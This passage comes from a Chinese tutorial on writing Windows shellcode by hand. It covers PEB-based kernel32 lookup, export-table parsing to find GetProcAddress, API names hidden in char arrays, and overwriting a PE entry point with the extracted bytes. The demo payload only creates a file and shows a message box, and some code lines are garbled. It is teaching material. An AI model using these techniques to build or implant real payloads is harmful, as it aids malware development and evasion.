        FN_LoadLibraryA fn_LoadLibraryA=(FN_LoadLibraryA)fn_GetProcAddress((HMODULE)getKernel32(),szLoadLibrary);
这样`LoadLibraryA`被替换为了`fn_LoadLibraryA`
然后再载入DLL为文件
        char szUser32[] = { 'U','s','e','r','3','2','.','d','l','l' };
        char szMsgBox[] = { 'M','e','s','s','a','g','e','B','o','x','A' };
        FN_MessageBoxA fn_MessageBoxA = (FN_MessageBoxA)fn_GetProcAddress((HMODULE)fn_LoadLibraryA(szUser32),szMsgBox);
最终的代码如下：
        //动态加载LoadLibraryA函数
        typedef HMODULE(WINAPI *FN_LoadLibraryA)
            (
                _In_ LPCSTR lpLibFileName
            );
        char szLoadLibrary[]= { 'L','o','a','d','L','i','b','r','a','r','y','A' ,0};
        FN_LoadLibraryA fn_LoadLibraryA=(FN_LoadLibraryA)fn_GetProcAddress((HMODULE)getKernel32(),szLoadLibrary);
        //动态加载MessageBoxA函数
        typedef int (WINAPI *FN_MessageBoxA)
            (
                _In_opt_ HWND hWnd,
                _In_opt_ LPCSTR lpText,
                _In_opt_ LPCSTR lpCaption,
                _In_ UINT uType
            );
        char szUser32[] = { 'U','s','e','r','3','2','.','d','l','l' };
        char szMsgBox[] = { 'M','e','s','s','a','g','e','B','o','x','A' };
        //载入DLL文件
        FN_MessageBoxA fn_MessageBoxA = (FN_MessageBoxA)fn_GetProcAddress((HMODULE)fn_LoadLibraryA(szUser32),szMsgBox);
        //调用函数
        char szMsgBoxContent[] = { 'H','e','l','l','o',' ','s','h','e','l','l','c','o','d','e','!' ,0 };
        char szMsgBoxTitle[] = { 's','h','e','l','l',0 };
        fn_MessageBoxA(NULL,szMsgBoxContent,szMsgBoxTitle, 0);
**4.最终的源代码**
    #pragma comment(linker, "/ENTRY:MainEntry")
    #include 
    DWORD getKernel32();
    FARPROC getProcAddress(HMODULE hMouduleBase);
    int MainEntry()
    {
        //CreateFileA("shellcode.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        typedef FARPROC (WINAPI *FN_GetProcAddress)
            (
                _In_ HMODULE hModule,
                _In_ LPCSTR lpProcName
            );
        FN_GetProcAddress fn_GetProcAddress = (FN_GetProcAddress)getProcAddress((HMODULE)getKernel32());
        typedef HANDLE(WINAPI *FN_CreateFileA)
            (
                __in     LPCSTR lpFileName,
                __in     DWORD dwDesiredAccess,
                __in     DWORD dwShareMode,
                __in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
                __in     DWORD dwCreationDisposition,
                __in     DWORD dwFlagsAndAttributes,
                __in_opt HANDLE hTemplateFile
                );
        char szCreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A',0 };
        char szNewFile[] = { 'S','h','e','l','l','c','o','d','e','.','t','x','t',0};
        FN_CreateFileA fn_CreateFileA = (FN_CreateFileA)fn_GetProcAddress((HMODULE)getKernel32(), szCreateFileA);
        fn_CreateFileA(szNewFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        typedef HMODULE(WINAPI *FN_LoadLibraryA)
            (
                _In_ LPCSTR lpLibFileName
            );
        char szLoadLibrary[]= { 'L','o','a','d','L','i','b','r','a','r','y','A' ,0};
        FN_LoadLibraryA fn_LoadLibraryA=(FN_LoadLibraryA)fn_GetProcAddress((HMODULE)getKernel32(),szLoadLibrary);
        typedef int (WINAPI *FN_MessageBoxA)
            (
                _In_opt_ HWND hWnd,
                _In_opt_ LPCSTR lpText,
                _In_opt_ LPCSTR lpCaption,
                _In_ UINT uType
            );
        char szUser32[] = { 'U','s','e','r','3','2','.','d','l','l' };
        char szMsgBox[] = { 'M','e','s','s','a','g','e','B','o','x','A' };
        FN_MessageBoxA fn_MessageBoxA = (FN_MessageBoxA)fn_GetProcAddress((HMODULE)fn_LoadLibraryA(szUser32),szMsgBox);
        char szMsgBoxContent[] = { 'H','e','l','l','o',' ','s','h','e','l','l','c','o','d','e','!' ,0 };
        char szMsgBoxTitle[] = { 's','h','e','l','l',0 };
        fn_MessageBoxA(NULL,szMsgBoxContent,szMsgBoxTitle, 0);
        //MessageBoxA(NULL, "Hello shellcode!", "shell", MB_OK);
        return 0;
    }
    __declspec(naked) DWORD getKernel32()
    {
        __asm
        {
            mov eax, fs:[0x30]
            mov eax, [eax + 0xc]
            mov eax, [eax + 0x14]
            mov eax, [eax]
            mov eax, [eax]
            mov eax, [eax + 0x10]
            ret
        }
    }
    FARPROC getProcAddress(HMODULE hMouduleBase)
    {
        //由之前找到的DllBase来得到DOS头的地址
        PIMAGE_DOS_HEADER lpDosHeader =
            (PIMAGE_DOS_HEADER)hMouduleBase;
        //找到 IMAGE_NT_HEADERS 的所在
        PIMAGE_NT_HEADERS32 lpNtHeader =
            (PIMAGE_NT_HEADERS)((DWORD)hMouduleBase + lpDosHeader->e_lfanew);
        if (!lpNtHeader->OptionalHeader//检查可选文件头的导出表大小是否 不为空
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)
        {
            return NULL;
        }
        if (!lpNtHeader->OptionalHeader//检查可选文件头的导出表的偏移是否 不为空
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
        {
            return NULL;
        }
        PIMAGE_EXPORT_DIRECTORY lpExport = //获得_IMAGE_EXPORT_DIRECTORY对象
            (PIMAGE_EXPORT_DIRECTORY)((DWORD)hMouduleBase + (DWORD)lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        //下面变量均是RVA,要加上hModuleBase
        PDWORD lpdwFunName =
            (PDWORD)((DWORD)hMouduleBase + (DWORD)lpExport->AddressOfNames);
        PWORD lpword =
            (PWORD)((DWORD)hMouduleBase + (DWORD)lpExport->AddressOfNameOrdinals);
        PDWORD lpdwFunAddr =
            (PDWORD)((DWORD)hMouduleBase + (DWORD)lpExport->AddressOfFunctions);
        //DWORD   AddressOfFunctions;      指向输出函数地址的RVA
        //DWORD   AddressOfNames;          指向输出函数名字的RVA
        //DWORD   AddressOfNameOrdinals;   指向输出函数序号的RVA
        DWORD dwLoop = 0;//遍历查找函数
        FARPROC pRet = NULL;
        for (; dwLoop NumberOfNames - 1; dwLoop++)
        {
            char *pFunName = (char*)(lpdwFunName[dwLoop] + (DWORD)hMouduleBase);//char *pFunName = lpwdFunName[0] = "func1";
            if (pFunName[0] == 'G'&&
                pFunName[1] == 'e'&&
                pFunName[2] == 't'&&
                pFunName[3] == 'P'&&
                pFunName[4] == 'r'&&
                pFunName[5] == 'o'&&
                pFunName[6] == 'c'&&
                pFunName[7] == 'A'&&
                pFunName[8] == 'd'&&
                pFunName[9] == 'd'&&
                pFunName[10] == 'r'&&
                pFunName[11] == 'e'&&
                pFunName[12] == 's'&&
                pFunName[13] == 's')
                //if(strcmp(pFunName,"GetProcAddress"))
            {
                pRet = (FARPROC)(lpdwFunAddr[lpword[dwLoop]] + (DWORD)hMouduleBase);
                break;
            }
        }
        return pRet;
    }
**5.提取shellcode并静态植入（生成框架）**
使用PEid来获得程序偏移量，从而得到程序加载到的地方
然后使用十六进制编辑器打开编写的程序，这里我用的是HxD，跳转到程序入口，也就是上面的偏移量
这里长度不能太短了，能把要执行的代码包裹完就行，这里选择到0x660的位置。
这样我们就得到了他的二进制代码，即shellcode
然后我们实现静态插入，这里我用PEView来测试
也是使用PEid来获得程序偏移量（0x400），然后在十六进制编辑器中转到，覆盖为我们上面shellcode
保存后运行：
这里成功创建了Shellcode.txt文件，然后成功弹出了MessageBox，但是字节填入过多，导致错误的参数被填入，我们这里是对PE文件进行直接覆盖，导致文件偏移计算有问题，最后乱码。
###  2.利用函数地址差提取shellcode
**1.预备知识**
**单文件中函数的位置**
这里要明白两种概念，函数定义、函数声明、函数编译的顺序
    #include 
    int Plus(int , int );//函数声明
    int main()
    {
        std::cout  "
    #include 
    int Plus(int , int );
    int Div(int, int);
    int main()
    {
        Plus(2, 3);
        Div(2, 3);
        return 0;
    }
    int Div(int a, int b)
    {
        puts("Divds");
        return a - b;
    }
    int Plus(int a, int b)
    {
        puts("Plus");
        return a + b;
    }
在IDA中观察，发现函数生成的顺序和声明的顺序不一样，起决定作用的是定义顺序。
利用编译顺序，将一直两端函数的地址做差，就能得到两函数之间的代码段的相对位置和程序代码段的大小
**多文件函数生成位置的关系**
项目文件如下
    //A.cpp
    #include "A.h"
    #include 
    void FuncA()
    {
        puts("This Is FuncA");
    }
    //B.cpp
    #include "B.h"
    #include 
    void FuncB()
    {
        puts("This Is FuncB");
    }
    //main.cpp
    #include 
    #include "A.h"
    #include "B.h"
    int main()
    {
        FuncA();
        FuncB();
    }
在IDA中
发现顺序是FuncA FuncB main，交换调用顺序和include的顺序，发现生成顺序依然没有改变。
其实编译顺序是由编译器的配置文件决定的，文件后缀名为：`.vcxproj`
修改上面cpp的顺序就修改函数生成顺序了
**2.编写代码**
还是按照创建程序的步骤建立一个项目， **但是不要关闭调试信息**
在项目里面添加一个 header.h 0.entry.cpp a_start.cpp
z_end.cpp，这样文件排序可以很直观的找到代码而且默认的编译顺序是0-9,a-Z
要实现的功能：0.entry.cpp提取shellcode，a_start.cpp z_end.cpp生成shellcode
header.h
    #pragma once
    #ifndef HEAD_H
    #define HEAD_H
    #include 
    void ShellcodeStart();
    void ShellcodeEntry();
    void ShellcodeEnd();
    DWORD getKernel32();
    FARPROC getProcAddress(HMODULE hMouduleBase);
    #endif // !HEAD_D
0.entry.cpp
> IO交互部分，不参与shellcode的部分
    #pragma comment(linker, "/ENTRY:MainEntry")
    #include 
    #include 
    #include "header.h"
    void CreateShellcode()//创建文件并写入
    {
        typedef  int (__CRTDECL *FN_printf)
            (char const* const _Format, ...);
        FN_printf fn_printf;
        fn_printf = (FN_printf)GetProcAddress(LoadLibraryA("msvcrt.dll"), "printf");
        HANDLE hBin = CreateFileA("sh.bin", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, 0, NULL);